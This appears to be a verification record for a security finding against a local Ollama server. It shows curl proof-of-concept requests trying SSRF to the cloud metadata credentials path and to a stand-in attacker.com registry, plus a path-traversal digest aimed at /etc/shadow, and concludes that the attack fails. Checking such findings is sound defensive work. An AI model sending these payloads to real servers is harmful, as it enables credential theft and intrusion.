Cold verification real-env evidence — p8-012-ssrf-push-chain-full-egress

Environment: ollama built from HEAD 57653b8e, go run on macOS darwin, listening on 127.0.0.1:11437
Commit: 57653b8e

Step 1 (exact PoC from finding):
  curl -X POST http://127.0.0.1:11437/api/pull -d '{"name":"169.254.169.254/latest/meta-data/iam/security-credentials/role:x","insecure":true}'
  Response: {"error":"invalid model name"}
  HTTP status: 400

Step 2 (exact PoC from finding):
  curl -X POST http://127.0.0.1:11437/api/pull -d '{"name":"attacker.com/m:latest","insecure":true}'
  Response: {"error":"invalid model name"}
  HTTP status: 400

Root cause: model.ParseName validates that
- host allows alnum/_/./-/: (NOT /)
- namespace allows alnum/_/- (NOT .)
Therefore:
  - "169.254.169.254/latest/meta-data/iam/security-credentials/role:x"
    parses to Host="169.254.169.254/latest/meta-data/iam" (contains /)
    -> isValidPart(kindHost) returns false -> INVALID
  - "attacker.com/m:latest"
    parses to Namespace="attacker.com" (contains .)
    -> isValidPart(kindNamespace) returns false -> INVALID

Reformed 3-part name variation (not in finding):
  curl -X POST http://127.0.0.1:11437/api/pull -d '{"name":"attacker.com/library/m:latest","insecure":true}'
  Response: {"status":"pulling manifest"} then error body reflected (Finding 002 surface).
  -> This shape is a VALID name but does not map to an IMDS path.

IMDS path structural incompatibility: the registry request URL is always
  <scheme>://<host>/v2/<ns>/<model>/manifests/<tag>
For IMDS to respond with credentials, the URL must be
  http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>
These URL shapes are incompatible — there is no valid model name that forms the IMDS path.

Push traversal link test (conceptual):
  The manifest with digest "sha256:../../../etc/shadow" cannot be persisted via pull
  because x/imagegen/transfer/download.go:257 verifies
    fmt.Sprintf("sha256:%x", h.Sum(nil)) == blob.Digest
  sha256 hex output cannot equal the non-hex string "../../../etc/shadow",
  so digest mismatch always fires and pullWithTransfer returns before writing
  the manifest (images.go:763-787 gates manifest write on download success).

Conclusion: both attacker-controlled entry points in the PoC are rejected at
the name-validation stage before any SSRF or manifest write can occur; and
even if reached, pull-side blob digest verification prevents a traversal
digest from being persisted into a manifest that push could later consume.
